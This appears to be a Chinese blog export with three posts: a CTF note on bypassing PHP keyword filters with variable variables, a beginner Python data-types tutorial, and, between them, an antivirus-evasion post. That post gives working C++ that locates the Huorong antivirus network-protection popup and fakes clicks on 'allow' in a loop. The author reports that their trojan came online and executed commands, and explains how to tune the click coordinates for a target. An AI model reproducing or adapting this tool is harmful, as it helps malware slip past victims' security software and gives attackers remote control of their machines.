    <content><![CDATA[<h4 id="bugku做题心得-闪电十六鞭"><a href="#bugku做题心得-闪电十六鞭" class="headerlink" title="bugku做题心得  闪电十六鞭"></a>bugku做题心得  闪电十六鞭</h4><h1 id><a href="#" class="headerlink" title></a><img src="/2021/12/27/%E5%8F%AF%E5%8F%98%E5%8F%98%E9%87%8F-%E4%BB%A3%E6%9B%BF-eval/image-20211109185349070.png" alt="image-20211109185349070"></h1><p>关于php短标签知识</p>
<p><img src="/2021/12/27/%E5%8F%AF%E5%8F%98%E5%8F%98%E9%87%8F-%E4%BB%A3%E6%9B%BF-eval/image-20211109190406505.png" alt="image-20211109190406505"></p>
<p><img src="/2021/12/27/%E5%8F%AF%E5%8F%98%E5%8F%98%E9%87%8F-%E4%BB%A3%E6%9B%BF-eval/image-20211109191650731.png" alt="image-20211109191650731"></p>
<p>关于php中大括号中的知识（这里使用{}代替了[]）</p>
<p><img src="/2021/12/27/%E5%8F%AF%E5%8F%98%E5%8F%98%E9%87%8F-%E4%BB%A3%E6%9B%BF-eval/image-20211109192111707.png" alt="image-20211109192111707"></p>
<p>然后就是用可变变量（变量覆盖）绕过了关键词检测。</p>
<p>还有就是eval函数自带了&lt;?php 不用在继续补充了</p>
<p><img src="/2021/12/27/%E5%8F%AF%E5%8F%98%E5%8F%98%E9%87%8F-%E4%BB%A3%E6%9B%BF-eval/image-20211109193424609.png" alt="image-20211109193424609"></p>
]]></content>
  </entry>
  <entry>
    <title>后台点击绕过火绒联网检测</title>
    <url>/2023/01/13/%E5%90%8E%E5%8F%B0%E7%82%B9%E5%87%BB%E7%BB%95%E8%BF%87%E7%81%AB%E7%BB%92%E8%81%94%E7%BD%91%E6%A3%80%E6%B5%8B/</url>
    <content><![CDATA[<h1 id="后台点击绕过火绒联网检测"><a href="#后台点击绕过火绒联网检测" class="headerlink" title="后台点击绕过火绒联网检测"></a>后台点击绕过火绒联网检测</h1><p>看到某个师傅的后台点击绕过火绒的联网检测。觉得值得一看，所以就记录学习一下.</p>
<h1 id="演示"><a href="#演示" class="headerlink" title="演示"></a>演示</h1><p><img src="/2023/01/13/%E5%90%8E%E5%8F%B0%E7%82%B9%E5%87%BB%E7%BB%95%E8%BF%87%E7%81%AB%E7%BB%92%E8%81%94%E7%BD%91%E6%A3%80%E6%B5%8B/image-20230113161355694.png" alt="image-20230113161355694"></p>
<p>发现如果直接运行木马的话，就会曝出联网检测。</p>
<p>现在我们打开编译好的，模拟点击。</p>
<p><img src="/2023/01/13/%E5%90%8E%E5%8F%B0%E7%82%B9%E5%87%BB%E7%BB%95%E8%BF%87%E7%81%AB%E7%BB%92%E8%81%94%E7%BD%91%E6%A3%80%E6%B5%8B/image-20230113161608501.png" alt="image-20230113161608501"></p>
<p><img src="/2023/01/13/%E5%90%8E%E5%8F%B0%E7%82%B9%E5%87%BB%E7%BB%95%E8%BF%87%E7%81%AB%E7%BB%92%E8%81%94%E7%BD%91%E6%A3%80%E6%B5%8B/image-20230113164931819.png" alt="image-20230113164931819"></p>
<p>就会瞬间关闭火绒的联网控制，而且点的是允许。现在我们换成我上次写的某个木马进行尝试。</p>
<p><img src="/2023/01/13/%E5%90%8E%E5%8F%B0%E7%82%B9%E5%87%BB%E7%BB%95%E8%BF%87%E7%81%AB%E7%BB%92%E8%81%94%E7%BD%91%E6%A3%80%E6%B5%8B/image-20230113182332411.png" alt="image-20230113182332411"></p>
<p><img src="/2023/01/13/%E5%90%8E%E5%8F%B0%E7%82%B9%E5%87%BB%E7%BB%95%E8%BF%87%E7%81%AB%E7%BB%92%E8%81%94%E7%BD%91%E6%A3%80%E6%B5%8B/image-20230113182320223.png" alt="image-20230113182320223"></p>
<p>成功上线并执行命令</p>
<h1 id="代码分析"><a href="#代码分析" class="headerlink" title="代码分析"></a>代码分析</h1><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="comment">//死循环</span></span><br><span class="line">	<span class="keyword">while</span> (<span class="literal">true</span>) &#123;</span><br><span class="line"></span><br><span class="line">		<span class="comment">//首先去获取火绒联网防护句柄</span></span><br><span class="line">		HWND hwnd1 = <span class="built_in">FindWindow</span>(<span class="string">&quot;ATL:01145CF8&quot;</span>, <span class="literal">NULL</span>);<span class="comment">//联网防护窗口类名，标题（NULL）</span></span><br><span class="line"></span><br><span class="line">		<span class="comment">//隐藏联网防护</span></span><br><span class="line">		<span class="comment">//ShowWindow(hwnd1, SW_HIDE);</span></span><br><span class="line">		std::cout &lt;&lt; hwnd1 &lt;&lt; std::endl;<span class="comment">//输出句柄</span></span><br><span class="line">		<span class="comment">//后台点击允许联网</span></span><br><span class="line">		<span class="keyword">if</span> (hwnd1 != <span class="literal">NULL</span>) &#123;</span><br><span class="line">			<span class="built_in">SendMessage</span>(hwnd1, WM_LBUTTONDOWN, MK_LBUTTON, <span class="built_in">MAKELPARAM</span>(<span class="number">309</span>, <span class="number">429</span>));</span><br><span class="line">			<span class="built_in">SendMessage</span>(hwnd1, WM_LBUTTONUP, MK_LBUTTON, <span class="built_in">MAKELPARAM</span>(<span class="number">309</span>, <span class="number">429</span>));</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="built_in">Sleep</span>(<span class="number">1</span>);<span class="comment">//设置时间很短，导致看上去就不会弹窗口了。</span></span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>其实也就是一个小玩具，我们每一个每一个函数来进行解析。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">HWND hwnd1 = FindWindow(&quot;ATL:01145CF8&quot;, NULL)</span><br><span class="line">这个函数其实就是实例化了一对象，HWND表示窗口句柄类的，hwnd1就是我们要获取到的窗口句柄。FindWindows，看名字就知道这个函数是干什么得了，找一个窗口。其中有两个参数第一个参数的意思是你要找的窗口的类名，这里就需要使用我们的spy++工具去获取目标电脑上面的火绒联网弹窗类名。获取到之后就填到这个函数里面就可以了。第二个参数是窗口的名称，用来指定要匹配的窗口名称，如果为NULL的话就匹配所有的窗口。</span><br></pre></td></tr></table></figure>

<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="built_in">SendMessage</span>(hwnd1, WM_LBUTTONDOWN, MK_LBUTTON, <span class="built_in">MAKELPARAM</span>(<span class="number">309</span>, <span class="number">429</span>));</span><br><span class="line">			<span class="built_in">SendMessage</span>(hwnd1, WM_LBUTTONUP, MK_LBUTTON, <span class="built_in">MAKELPARAM</span>(<span class="number">309</span>, <span class="number">429</span>));</span><br><span class="line">			</span><br><span class="line">上面的判断和输出都是最基础的我就不写了，这里判断检测到窗口之后，就会执行下面的代码。这是一个sendmessage函数，他的作用就是发送一些操作到我们指定的窗口去。第一个参数就需要输入窗口句柄，第二个参数是执行什么东西，我这里就是WM_LBUTTONDOWN和up，意思就是按下鼠标左键和释放鼠标左键的意思。后面两个参数指定了软模拟鼠标的需要点击的坐标。坐标是相对坐标，也就是以你这个句柄的左上角为原点建立的一个坐标系。窗口大小的话同样也可以使用spy++工具来进行获取。我这里都坐标就是点击右下角，因为我的木马还没编译，所以是python执行的，在白名单里面，允许按钮在右下角。如果不是在白名单里面，那么，你就需要吧<span class="number">429</span>改成<span class="number">0</span>点击左下角的允许即可。</span><br></pre></td></tr></table></figure>

<p>根据这个模拟键鼠的思路，其实后续我们可以试一下报毒的时候能不能模拟键鼠。</p>
]]></content>
      <categories>
        <category>-miansha</category>
      </categories>
  </entry>
  <entry>
    <title>四、学习py：数据类型</title>
    <url>/2021/12/29/%E5%9B%9B%E3%80%81%E5%AD%A6%E4%B9%A0py%EF%BC%9A%E6%95%B0%E6%8D%AE%E7%B1%BB%E5%9E%8B/</url>
    <content><![CDATA[<h1 id="四、学习py：数据类型"><a href="#四、学习py：数据类型" class="headerlink" title="四、学习py：数据类型"></a>四、学习py：数据类型</h1><h2 id="1-整型"><a href="#1-整型" class="headerlink" title="1.整型"></a>1.整型</h2><h3 id="1-1定义"><a href="#1-1定义" class="headerlink" title="1.1定义"></a>1.1定义</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">number = <span class="number">10</span></span><br><span class="line">age = <span class="number">123</span></span><br></pre></td></tr></table></figure>

<h3 id="1-2独有功能"><a href="#1-2独有功能" class="headerlink" title="1.2独有功能"></a>1.2独有功能</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">v1 = <span class="number">5</span></span><br><span class="line"><span class="comment">#调用v1的独有功能，获取v1的二进制有多少个位组成。</span></span><br><span class="line">result = v1.bit_length()</span><br><span class="line"><span class="built_in">print</span>(result)<span class="comment">#3</span></span><br></pre></td></tr></table></figure>



<h3 id="1-3公共功能"><a href="#1-3公共功能" class="headerlink" title="1.3公共功能"></a>1.3公共功能</h3><p>加减乘除</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">v1 = <span class="number">2</span></span><br><span class="line">v2 = <span class="number">3</span></span><br><span class="line">v3 = v1 + v2</span><br></pre></td></tr></table></figure>

<h3 id="1-4转换"><a href="#1-4转换" class="headerlink" title="1.4转换"></a>1.4转换</h3><p><img src="/2021/12/29/%E5%9B%9B%E3%80%81%E5%AD%A6%E4%B9%A0py%EF%BC%9A%E6%95%B0%E6%8D%AE%E7%B1%BB%E5%9E%8B/image-20211228212654320.png" alt="image-20211228212654320"></p>
<h2 id="2-布尔类型"><a href="#2-布尔类型" class="headerlink" title="2.布尔类型"></a>2.布尔类型</h2><h3 id="2-1定义"><a href="#2-1定义" class="headerlink" title="2.1定义"></a>2.1定义</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">dhk_is_a_joker = <span class="literal">True</span></span><br><span class="line">yj_is_wired = <span class="literal">False</span></span><br></pre></td></tr></table></figure>

<h3 id="2-2独有功能"><a href="#2-2独有功能" class="headerlink" title="2.2独有功能"></a>2.2独有功能</h3><p>无</p>
<h3 id="2-3公共功能"><a href="#2-3公共功能" class="headerlink" title="2.3公共功能"></a>2.3公共功能</h3><p>无</p>
<h3 id="2-4转换"><a href="#2-4转换" class="headerlink" title="2.4转换"></a>2.4转换</h3><p>使用函数bool() 任何的数据类型都能够转换成布尔类型</p>
<p>注：只有整数0、空字符、空元组、空列表、空字典转换为布尔值的时候均为False</p>
<h3 id="2-5其他"><a href="#2-5其他" class="headerlink" title="2.5其他"></a>2.5其他</h3><p>如果在if while 条件后面写一个值当做条件时，他会默认转换为布尔类型，然后再做条件判断。</p>
<h2 id="3-字符串类型"><a href="#3-字符串类型" class="headerlink" title="3.字符串类型"></a>3.字符串类型</h2><p>用来表示文本信息。</p>
<h3 id="3-1定义"><a href="#3-1定义" class="headerlink" title="3.1定义"></a>3.1定义</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">v1 = <span class="string">&quot;dhk小丑&quot;</span></span><br><span class="line">v5 = <span class="string">&quot;&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">dhk</span></span><br><span class="line"><span class="string">他就是一个小丑</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="built_in">print</span>(v5)</span><br></pre></td></tr></table></figure>

<h3 id="3-2独有功能（13-48）"><a href="#3-2独有功能（13-48）" class="headerlink" title="3.2独有功能（13/48）"></a>3.2独有功能（13/48）</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="string">&quot;xxx&quot;</span>.功能(...)</span><br><span class="line">v1 = <span class="string">&quot;xxx&quot;</span></span><br><span class="line">v1.功能(...)</span><br></pre></td></tr></table></figure>

<h4 id="3-2-1判断字符串是否是以xx开头？得到一个布尔值"><a href="#3-2-1判断字符串是否是以xx开头？得到一个布尔值" class="headerlink" title="3.2.1判断字符串是否是以xx开头？得到一个布尔值"></a>3.2.1判断字符串是否是以xx开头？得到一个布尔值</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">v1 = <span class="string">&quot;xx is joker&quot;</span></span><br><span class="line">result = v1.startswith(<span class="string">&quot;xx&quot;</span>)  	</span><br></pre></td></tr></table></figure>

<h4 id="3-2-2判断字符串是否以xx结尾？得到一个布尔值"><a href="#3-2-2判断字符串是否以xx结尾？得到一个布尔值" class="headerlink" title="3.2.2判断字符串是否以xx结尾？得到一个布尔值"></a>3.2.2判断字符串是否以xx结尾？得到一个布尔值</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">v1 = <span class="string">&quot;xx is joker&quot;</span></span><br><span class="line">result = v1.endswith(<span class="string">&quot;joker&quot;</span>)</span><br></pre></td></tr></table></figure>

<h4 id="3-2-3判断一个字符串是否为十进制数？得到一个布尔值"><a href="#3-2-3判断一个字符串是否为十进制数？得到一个布尔值" class="headerlink" title="3.2.3判断一个字符串是否为十进制数？得到一个布尔值"></a>3.2.3判断一个字符串是否为十进制数？得到一个布尔值</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">v1 = <span class="string">&quot;123&quot;</span></span><br><span class="line">result = v1.isdecimal()</span><br></pre></td></tr></table></figure>

<h4 id="3-2-4去除字符串两边的空格、换行符、制表符、得到一个新的字符串"><a href="#3-2-4去除字符串两边的空格、换行符、制表符、得到一个新的字符串" class="headerlink" title="3.2.4去除字符串两边的空格、换行符、制表符、得到一个新的字符串"></a>3.2.4去除字符串两边的空格、换行符、制表符、得到一个新的字符串</h4><p>在我的第一篇py博客里面有</p>
<p>额但是方便查阅的话我还是在这里写一下</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">去两边空格：<span class="built_in">str</span>.strip()</span><br><span class="line"></span><br><span class="line">去左空格：<span class="built_in">str</span>.lstrip()</span><br><span class="line"></span><br><span class="line">去右空格：<span class="built_in">str</span>.rstrip()</span><br><span class="line"></span><br><span class="line">去两边字符串：<span class="built_in">str</span>.strip(‘d’)，相应的也有lstrip，rstrip。</span><br></pre></td></tr></table></figure>

<p>补充:strip可以去除空格、换行符、制表符，不仅仅是空格。</p>
<h4 id="3-2-5字符串变成大写，得到一个新字符串"><a href="#3-2-5字符串变成大写，得到一个新字符串" class="headerlink" title="3.2.5字符串变成大写，得到一个新字符串"></a>3.2.5字符串变成大写，得到一个新字符串</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">msg = <span class="string">&quot;dhk is a joker&quot;</span></span><br><span class="line">data = msg.upper()</span><br></pre></td></tr></table></figure>

<h4 id="3-2-6字符串变成小写，得到一个新字符串"><a href="#3-2-6字符串变成小写，得到一个新字符串" class="headerlink" title="3.2.6字符串变成小写，得到一个新字符串"></a>3.2.6字符串变成小写，得到一个新字符串</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">msg = <span class="string">&quot;dhk is a joker&quot;</span></span><br><span class="line">data = msg.lower()</span><br></pre></td></tr></table></figure>

<h4 id="3-2-7字符串的内容的替换，得到一个新的字符串"><a href="#3-2-7字符串的内容的替换，得到一个新的字符串" class="headerlink" title="3.2.7字符串的内容的替换，得到一个新的字符串"></a>3.2.7字符串的内容的替换，得到一个新的字符串</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">data = <span class="string">&quot;動感是一個小丑&quot;</span></span><br><span class="line">value = data.replace(<span class="string">&quot;動感&quot;</span>,<span class="string">&quot;dhk&quot;</span>)</span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#案例</span></span><br><span class="line">char_list = [<span class="string">&quot;尼瑪&quot;</span>,<span class="string">&quot;sb&quot;</span>]</span><br><span class="line">content = <span class="built_in">input</span>(<span class="string">&quot;請輸入評論&quot;</span>)</span><br><span class="line"><span class="keyword">for</span> item <span class="keyword">in</span> char_list:</span><br><span class="line">    content = content.replac(item,<span class="string">&quot;*&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(content)</span><br></pre></td></tr></table></figure>

<h4 id="3-2-8字符串切割，得到一个列表"><a href="#3-2-8字符串切割，得到一个列表" class="headerlink" title="3.2.8字符串切割，得到一个列表"></a>3.2.8字符串切割，得到一个列表</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">data = <span class="string">&quot;dhk|joker|小丑&quot;</span></span><br><span class="line">result = data.split(<span class="string">&#x27;|&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(result)</span><br><span class="line"><span class="comment">#输出</span></span><br><span class="line"><span class="comment">#[&#x27;dhk&#x27;, &#x27;joker&#x27;, &#x27;小丑&#x27;]</span></span><br><span class="line"><span class="comment">#也不一定非要用|你也可以用其他的比如逗号之类的。</span></span><br><span class="line"><span class="comment">#同时也可以用变量来接受每一个列表中的元素，但是变量的数量必须要等于元素的数量。</span></span><br></pre></td></tr></table></figure>

<p>注：1.也可以指定切几个，data.split(‘|’,1),这个就是只切一个。</p>
<p>2.rsplit()就是从右边开始切。</p>
<h4 id="3-2-9字符串拼接，得到一个新的字符串"><a href="#3-2-9字符串拼接，得到一个新的字符串" class="headerlink" title="3.2.9字符串拼接，得到一个新的字符串"></a>3.2.9字符串拼接，得到一个新的字符串</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">data_list = [<span class="string">&quot;dhk&quot;</span>,<span class="string">&quot;is&quot;</span>,<span class="string">&quot;joker&quot;</span>]</span><br><span class="line">result = <span class="string">&quot;*&quot;</span>.join(data_list)</span><br><span class="line"><span class="built_in">print</span>(result)</span><br><span class="line"><span class="comment">#输出</span></span><br><span class="line"><span class="comment">#dhk*is*joker</span></span><br><span class="line"><span class="comment">#当然也可以什么都不加</span></span><br></pre></td></tr></table></figure>

<h4 id="3-2-10字符串格式化，得到新的字符串"><a href="#3-2-10字符串格式化，得到新的字符串" class="headerlink" title="3.2.10字符串格式化，得到新的字符串"></a>3.2.10字符串格式化，得到新的字符串</h4><p>也在第二篇出现过</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">name = <span class="string">&quot;越江&quot;</span></span><br><span class="line"></span><br><span class="line">age = <span class="number">123</span></span><br><span class="line"></span><br><span class="line">text = <span class="string">&quot;我叫%s ，今年%s岁.&quot;</span> %(name,age)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">text = <span class="string">&quot;我叫&#123;0&#125;,今年&#123;1&#125;岁,真正的名字叫做&#123;0&#125;&quot;</span>.<span class="built_in">format</span>(<span class="string">&quot;越江&quot;</span>,<span class="string">&quot;99&quot;</span>)</span><br><span class="line">text = <span class="string">&quot;我叫&#123;n1&#125;&quot;</span>.<span class="built_in">format</span>(n1 = <span class="string">&quot;越江&quot;</span>)</span><br><span class="line"><span class="comment">#data = text.format(n1=&quot;越江&quot;)</span></span><br><span class="line"><span class="comment">#模板复用</span></span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">dhk = <span class="string">&quot;動感&quot;</span></span><br><span class="line">age = <span class="number">12</span></span><br><span class="line">text = <span class="string">f&quot;<span class="subst">&#123;dhk&#125;</span>是一個小丑，今年<span class="subst">&#123;age:#b&#125;</span>岁了&quot;</span></span><br><span class="line"><span class="comment">#将数字转换成二进制进行显示（一个扩展罢了，其中进制的代表符号和数电里面一样。）</span></span><br></pre></td></tr></table></figure>

<h4 id="3-2-11字符串转换为字节类型"><a href="#3-2-11字符串转换为字节类型" class="headerlink" title="3.2.11字符串转换为字节类型"></a>3.2.11字符串转换为字节类型</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">data = <span class="string">&quot;动感&quot;</span><span class="comment">#unicode,字符串类型</span></span><br><span class="line">v1 = data.encode(<span class="string">&quot;utf-8&quot;</span>)<span class="comment">#字节类型</span></span><br></pre></td></tr></table></figure>

<h4 id="3-2-12将字符串内容居中，居左，居右"><a href="#3-2-12将字符串内容居中，居左，居右" class="headerlink" title="3.2.12将字符串内容居中，居左，居右"></a>3.2.12将字符串内容居中，居左，居右</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">v1 = <span class="string">&quot;动感&quot;</span></span><br><span class="line">data = v1.center(<span class="number">20</span>,<span class="string">&quot;*&quot;</span>)<span class="comment">#将动感放在中间，左边放*右边放*，凑成20个字符</span></span><br><span class="line"><span class="built_in">print</span>(data)</span><br><span class="line"><span class="comment">#输出</span></span><br><span class="line"><span class="comment">#*********动感*********</span></span><br></pre></td></tr></table></figure>

<p>还有ljust()和rljust,就不多赘述。</p>
<h4 id="3-2-13-填充0"><a href="#3-2-13-填充0" class="headerlink" title="3.2.13 填充0"></a>3.2.13 填充0</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">data = <span class="string">&quot;dhk&quot;</span></span><br><span class="line">data = data.zfill(<span class="number">10</span>)</span><br><span class="line"><span class="built_in">print</span>(data)</span><br><span class="line"><span class="comment">#输出</span></span><br><span class="line"><span class="comment">#0000000dhk</span></span><br><span class="line"><span class="comment">#虽然和rjust差不多，但是zill更多的适用于处理二进制数据。</span></span><br></pre></td></tr></table></figure>

<h4 id="3-2-14补充函数random-后面会写random模块"><a href="#3-2-14补充函数random-后面会写random模块" class="headerlink" title="3.2.14补充函数random(后面会写random模块)"></a>3.2.14补充函数random(后面会写random模块)</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> random</span><br><span class="line">code = random.randrange(<span class="number">1</span>,<span class="number">123</span>)<span class="comment">#随机生成一个1-123的数字</span></span><br><span class="line"><span class="built_in">print</span>(code)</span><br></pre></td></tr></table></figure>

<h3 id="3-3公共功能"><a href="#3-3公共功能" class="headerlink" title="3.3公共功能"></a>3.3公共功能</h3><h4 id="3-3-1相加-str-str"><a href="#3-3-1相加-str-str" class="headerlink" title="3.3.1相加(str+str)"></a>3.3.1相加(str+str)</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">v1 = <span class="string">&quot;dhk&quot;</span> + <span class="string">&quot;joker&quot;</span></span><br></pre></td></tr></table></figure>

<h4 id="3-3-2相乘（str-int）"><a href="#3-3-2相乘（str-int）" class="headerlink" title="3.3.2相乘（str*int）"></a>3.3.2相乘（str*int）</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">data = <span class="string">&quot;dhk&quot;</span> * <span class="number">3</span></span><br><span class="line"><span class="built_in">print</span>(data)<span class="comment">#dhkdhkdhk</span></span><br></pre></td></tr></table></figure>

<h4 id="3-3-3长度"><a href="#3-3-3长度" class="headerlink" title="3.3.3长度"></a>3.3.3长度</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">data = <span class="string">&quot;dhk&quot;</span></span><br><span class="line">v1 = <span class="built_in">len</span>(data)</span><br></pre></td></tr></table></figure>

<h4 id="3-3-4获取字符串中的字符，基于索引"><a href="#3-3-4获取字符串中的字符，基于索引" class="headerlink" title="3.3.4获取字符串中的字符，基于索引"></a>3.3.4获取字符串中的字符，基于索引</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">msg = <span class="string">&quot;dhk is a jocker&quot;</span></span><br><span class="line"><span class="built_in">print</span>(msg[<span class="number">0</span>])</span><br><span class="line"><span class="built_in">print</span>(msg[<span class="number">2</span>])</span><br><span class="line"><span class="comment">#d</span></span><br><span class="line"><span class="comment">#k</span></span><br><span class="line"><span class="built_in">print</span>(msg[-<span class="number">1</span>])<span class="comment">#r，就是倒着取</span></span><br></pre></td></tr></table></figure>

<p>注：字符串中只能通过索引取值，不能修改值【字符串在内部存储时是不允许对内部元素进行修改的。】</p>
<p>ex:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">message = <span class="string">&quot;dhk is a joker&quot;</span></span><br><span class="line">index = <span class="number">0</span></span><br><span class="line"><span class="keyword">while</span> index&lt;<span class="built_in">len</span>(message)：</span><br><span class="line">    value = message[index]</span><br><span class="line">    <span class="built_in">print</span>(value)</span><br><span class="line">    index += <span class="number">1</span></span><br><span class="line"><span class="comment">#展示message里面的所有字符，感觉有点像php中的变量覆盖。</span></span><br></pre></td></tr></table></figure>

<h4 id="3-3-5获取字符串中的子序列，切片"><a href="#3-3-5获取字符串中的子序列，切片" class="headerlink" title="3.3.5获取字符串中的子序列，切片"></a>3.3.5获取字符串中的子序列，切片</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">message = <span class="string">&quot;动感是小丑&quot;</span></span><br><span class="line">message[<span class="number">0</span>:<span class="number">2</span>]<span class="comment">#动感（前取后不取，记得是从0开始）</span></span><br><span class="line">message[<span class="number">3</span>:<span class="number">5</span>]<span class="comment">#小丑</span></span><br><span class="line">message[<span class="number">3</span>:-<span class="number">1</span>]<span class="comment">#小</span></span><br><span class="line">message[<span class="number">0</span>:<span class="built_in">len</span>(message)]<span class="comment">#动感是个小丑</span></span><br><span class="line">message[<span class="number">0</span>:]<span class="comment">#动感是个小丑</span></span><br></pre></td></tr></table></figure>

<p>注：同样也只能读取数据</p>
<h4 id="3-3-6步长"><a href="#3-3-6步长" class="headerlink" title="3.3.6步长"></a>3.3.6步长</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">message = <span class="string">&quot;动感是小丑&quot;</span></span><br><span class="line">message[<span class="number">0</span>:<span class="number">2</span>]<span class="comment">#动感（前取后不取，记得是从0开始）</span></span><br><span class="line">message[<span class="number">0</span>:<span class="number">5</span>:<span class="number">2</span>]<span class="comment">#隔一个取一个</span></span><br></pre></td></tr></table></figure>

<h4 id="3-3-7循环"><a href="#3-3-7循环" class="headerlink" title="3.3.7循环"></a>3.3.7循环</h4><p>while循环</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">message = <span class="string">&quot;dhk is a joker&quot;</span></span><br><span class="line">index = <span class="number">0</span></span><br><span class="line"><span class="keyword">while</span> index&lt;<span class="built_in">len</span>(message)：</span><br><span class="line">    value = message[index]</span><br><span class="line">    <span class="built_in">print</span>(value)</span><br><span class="line">    index += <span class="number">1</span></span><br></pre></td></tr></table></figure>

<p>for循环</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">message = <span class="string">&quot;动感是小丑&quot;</span></span><br><span class="line"><span class="keyword">for</span> char <span class="keyword">in</span> message:</span><br><span class="line">    <span class="built_in">print</span>(char)<span class="comment">#char在这里是一个变量</span></span><br><span class="line"><span class="comment">#显示结果和上面的while循环一样</span></span><br></pre></td></tr></table></figure>

<p>range，帮助我们创建一些列的数字。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="built_in">range</span>(<span class="number">10</span>)<span class="comment">#[0,1,2,3,4,5,6,7,8,9]</span></span><br><span class="line"><span class="built_in">range</span>(<span class="number">1</span>,<span class="number">10</span>)<span class="comment">#[1,2,3,4,5,6,7,8,9]</span></span><br><span class="line"><span class="comment">#同样也可以加入步长。步长为-1则为倒叙。</span></span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">message = <span class="string">&quot;动感是小丑&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>( <span class="built_in">len</span>(message) ):</span><br><span class="line">    <span class="built_in">print</span>(message[i])</span><br></pre></td></tr></table></figure>

<p>扩充：一般的循环运用场景</p>
<p>while:一般在做无限制（未知）循环此处时使用#比如说让用户输入整数，不是整数就不结束，是整数就直接结束。</p>
<p>for：已知循环循环数量的时候使用。</p>
<h3 id="3-4类型转换"><a href="#3-4类型转换" class="headerlink" title="3.4类型转换"></a>3.4类型转换</h3><p>str()</p>
<h3 id="3-5字符串不可被修改"><a href="#3-5字符串不可被修改" class="headerlink" title="3.5字符串不可被修改"></a>3.5字符串不可被修改</h3><h2 id="4-列表（list）"><a href="#4-列表（list）" class="headerlink" title="4.列表（list）"></a>4.列表（list）</h2><p>列表，是一个有序且可变的容器，在里面可以存放多不同类型个元素</p>
<h3 id="4-1定义"><a href="#4-1定义" class="headerlink" title="4.1定义"></a>4.1定义</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">user_list = [<span class="string">&quot;dhk&quot;</span>,<span class="string">&quot;小丑&quot;</span>,<span class="string">&quot;动感&quot;</span>]</span><br><span class="line">number_list = [<span class="number">1</span>,<span class="number">2</span>,<span class="number">1123</span>,-<span class="number">1</span>]</span><br><span class="line">data_list = [<span class="number">1</span>,<span class="literal">True</span>,<span class="string">&quot;动感&quot;</span>]</span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">user_list = []</span><br><span class="line">user_list.append(<span class="string">&quot;动感&quot;</span>)</span><br><span class="line">user_list.append(<span class="string">&quot;joker&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(user_list)</span><br><span class="line"><span class="comment">#输出</span></span><br><span class="line"><span class="comment">#[&#x27;动感&#x27;, &#x27;joker&#x27;]</span></span><br></pre></td></tr></table></figure>

<h3 id="4-2独有功能"><a href="#4-2独有功能" class="headerlink" title="4.2独有功能"></a>4.2独有功能</h3><p>python中为所有的列表类型的数据提供了一批独有的功能。</p>
<p>这里之介绍常用的功能</p>
